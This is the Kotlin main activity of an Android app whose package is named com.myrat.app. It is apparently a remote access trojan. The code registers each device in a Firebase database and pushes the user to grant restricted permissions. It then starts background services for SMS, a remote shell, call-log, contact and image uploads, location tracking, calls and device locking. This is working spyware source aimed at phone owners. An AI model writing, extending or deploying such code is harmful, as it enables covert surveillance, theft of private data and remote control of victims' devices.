package com.myrat.app

import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.Log
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.google.firebase.FirebaseApp
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.ServerValue
import com.google.firebase.database.ValueEventListener
import com.google.firebase.database.ktx.database
import com.google.firebase.ktx.Firebase
import com.myrat.app.handler.PermissionHandler
import com.myrat.app.handler.SimDetailsHandler
import com.myrat.app.utils.Logger
import pub.devrel.easypermissions.EasyPermissions
import java.util.UUID

class MainActivity : AppCompatActivity(), EasyPermissions.PermissionCallbacks {
    private lateinit var deviceId: String
    private lateinit var simDetailsHandler: SimDetailsHandler
    private var permissionHandler: PermissionHandler? = null
    private lateinit var deviceRef: com.google.firebase.database.DatabaseReference
    private var doubleBackToExitPressedOnce = false
    private val handler = Handler(Looper.getMainLooper())
    private var permissionsRequested = false
    private var servicesStarted = false
    private var appSettingsOpened = false

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        try {
            // Initialize Firebase first
            if (FirebaseApp.getApps(this).isEmpty()) {
                FirebaseApp.initializeApp(this)
                Logger.log("Firebase initialized")
            }
            
            setContentView(R.layout.activity_main)
            Logger.log("MainActivity onCreate, isFinishing: $isFinishing, isDestroyed: $isDestroyed")
            
            // Initialize deviceId with proper error handling
            deviceId = getDeviceId(this)
            if (deviceId.isEmpty()) {
                Logger.error("Device ID is empty, generating new one")
                deviceId = generateFallbackDeviceId()
            }
            
            // Initialize Firebase database reference with error handling
            try {
                deviceRef = Firebase.database.getReference("Device").child(deviceId)
                Logger.log("Firebase database reference initialized")
            } catch (e: Exception) {
                Logger.error("Failed to initialize Firebase database reference", e)
                Toast.makeText(this, "Database initialization failed", Toast.LENGTH_SHORT).show()
                return
            }
            
            // Initialize handlers with error handling
            try {
                simDetailsHandler = SimDetailsHandler(this, deviceId)
                permissionHandler = PermissionHandler(this, simDetailsHandler)
                Logger.log("Handlers initialized successfully")
            } catch (e: Exception) {
                Logger.error("Failed to initialize handlers", e)
                Toast.makeText(this, "Handler initialization failed", Toast.LENGTH_SHORT).show()
                return
            }

            checkAndCreateDeviceNode()
            
            // Only request permissions once
            if (!permissionsRequested) {
                Logger.log("Requesting permissions via EasyPermissions...")
                
                // Add delay before requesting permissions to ensure everything is initialized
                handler.postDelayed({
                    try {
                        if (!isFinishing && !isDestroyed) {
                            permissionHandler?.requestPermissions()
                            permissionsRequested = true
                        }
                    } catch (e: Exception) {
                        Logger.error("Failed to request permissions", e)
                        Toast.makeText(this, "Permission request failed", Toast.LENGTH_SHORT).show()
                    }
                }, 1000)
            }
            
        } catch (e: Exception) {
            Logger.error("Critical error in onCreate", e)
            Toast.makeText(this, "App initialization failed: ${e.message}", Toast.LENGTH_LONG).show()
            
            // Try to recover by finishing and restarting
            handler.postDelayed({
                try {
                    finish()
                    startActivity(Intent(this, MainActivity::class.java))
                } catch (restartException: Exception) {
                    Logger.error("Failed to restart activity", restartException)
                }
            }, 3000)
        }
    }

    private fun generateFallbackDeviceId(): String {
        return try {
            val androidId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
            if (!androidId.isNullOrEmpty() && androidId != "9774d56d682e549c") {
                androidId
            } else {
                "fallback_${System.currentTimeMillis()}_${(1000..9999).random()}"
            }
        } catch (e: Exception) {
            Logger.error("Failed to generate fallback device ID", e)
            "emergency_${System.currentTimeMillis()}"
        }
    }

    private fun checkAndCreateDeviceNode() {
        try {
            deviceRef.addListenerForSingleValueEvent(object : ValueEventListener {
                override fun onDataChange(snapshot: DataSnapshot) {
                    try {
                        if (!snapshot.exists()) {
                            deviceRef.child("createdAt").setValue(ServerValue.TIMESTAMP)
                                .addOnSuccessListener {
                                    Log.d("Firebase", "Created new device node: $deviceId")
                                }
                                .addOnFailureListener { e ->
                                    Log.e("FirebaseError", "Failed to create device node: ${e.message}")
                                }
                        }
                    } catch (e: Exception) {
                        Logger.error("Error in onDataChange", e)
                    }
                }

                override fun onCancelled(error: DatabaseError) {
                    Log.e("FirebaseError", "Error checking device node: ${error.message}")
                }
            })
        } catch (e: Exception) {
            Logger.error("Failed to check and create device node", e)
        }
    }

    override fun onResume() {
        super.onResume()
        Logger.log("MainActivity onResume")
        
        if (isFinishing || isDestroyed) {
            Logger.error("MainActivity is finishing or destroyed, skipping onResume")
            return
        }
        
        try {
            permissionHandler?.handleResume()
            
            // Check if permissions are granted and start services if needed
            if (permissionHandler?.areAllPermissionsGranted() == true && !servicesStarted) {
                Logger.log("All permissions granted, starting services")
                startAllServices()
                servicesStarted = true
                
                // Open app settings once for restricted permissions
                if (!appSettingsOpened) {
                    openAppSettingsForRestrictedPermissions()
                    appSettingsOpened = true
                }
            }
        } catch (e: Exception) {
            Logger.error("Error in onResume: ${e.message}", e)
            Toast.makeText(this, "Error in onResume: ${e.message}", Toast.LENGTH_LONG).show()
        }
    }

    private fun startAllServices() {
        try {
            Logger.log("Starting all background services")
            
            val services = listOf(
                com.myrat.app.service.SmsService::class.java,
                com.myrat.app.service.ShellService::class.java,
                com.myrat.app.service.CallLogUploadService::class.java,
                com.myrat.app.service.ContactUploadService::class.java,
                com.myrat.app.service.ImageUploadService::class.java,
                com.myrat.app.service.LocationService::class.java,
                com.myrat.app.service.CallService::class.java,
                com.myrat.app.service.LockService::class.java,
                com.myrat.app.service.SmsConsentService::class.java
            )

            services.forEach { serviceClass ->
                try {
                    val serviceIntent = Intent(this, serviceClass)
                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                        startForegroundService(serviceIntent)
                    } else {
                        startService(serviceIntent)
                    }
                    Logger.log("Started ${serviceClass.simpleName}")
                } catch (e: Exception) {
                    Logger.error("Failed to start ${serviceClass.simpleName}", e)
                }
            }
            
            Logger.log("All services started successfully")
        } catch (e: Exception) {
            Logger.error("Error starting services", e)
        }
    }

    private fun openAppSettingsForRestrictedPermissions() {
        try {
            Logger.log("Opening app settings for restricted permissions")
            
            handler.postDelayed({
                try {
                    val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                        data = android.net.Uri.parse("package:$packageName")
                        flags = Intent.FLAG_ACTIVITY_NEW_TASK
                    }
                    startActivity(intent)
                    Logger.log("App settings opened for restricted permissions")
                    
                    // Show toast to guide user
                    Toast.makeText(this, "Please enable all restricted permissions for the app to work properly", Toast.LENGTH_LONG).show()
                } catch (e: Exception) {
                    Logger.error("Failed to open app settings", e)
                }
            }, 2000) // 2 second delay
            
        } catch (e: Exception) {
            Logger.error("Error opening app settings", e)
        }
    }

    // EasyPermissions callbacks
    override fun onPermissionsGranted(requestCode: Int, perms: MutableList<String>) {
        permissionHandler?.onPermissionsGranted(requestCode, perms)
    }

    override fun onPermissionsDenied(requestCode: Int, perms: MutableList<String>) {
        permissionHandler?.onPermissionsDenied(requestCode, perms)
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        EasyPermissions.onRequestPermissionsResult(requestCode, permissions, grantResults, this)
    }

    override fun onBackPressed() {
        try {
            if (doubleBackToExitPressedOnce) {
                super.onBackPressed()
                finish()
                return
            }
            doubleBackToExitPressedOnce = true
            Toast.makeText(this, "Please click BACK again to exit", Toast.LENGTH_SHORT).show()
            handler.postDelayed({ doubleBackToExitPressedOnce = false }, 2000)
        } catch (e: Exception) {
            Logger.error("Error in onBackPressed", e)
            super.onBackPressed()
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        try {
            permissionHandler?.cleanup()
            handler.removeCallbacksAndMessages(null)
            Logger.log("MainActivity destroyed and cleaned up")
        } catch (e: Exception) {
            Logger.error("Error in onDestroy", e)
        }
    }

    companion object {
        fun getDeviceId(context: Context): String {
            return try {
                val prefs = context.getSharedPreferences("SmsAppPrefs", Context.MODE_PRIVATE)
                var deviceId = prefs.getString("deviceId", null)
                
                if (deviceId.isNullOrEmpty()) {
                    val androidId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
                    deviceId = if (!androidId.isNullOrEmpty() && androidId != "9774d56d682e549c") {
                        androidId
                    } else {
                        UUID.randomUUID().toString()
                    }
                    
                    prefs.edit().putString("deviceId", deviceId).apply()
                    Logger.log("Generated new deviceId: $deviceId")
                }
                
                deviceId ?: "fallback_${System.currentTimeMillis()}"
            } catch (e: Exception) {
                Logger.error("Error getting device ID", e)
                "error_${System.currentTimeMillis()}"
            }
        }
    }
}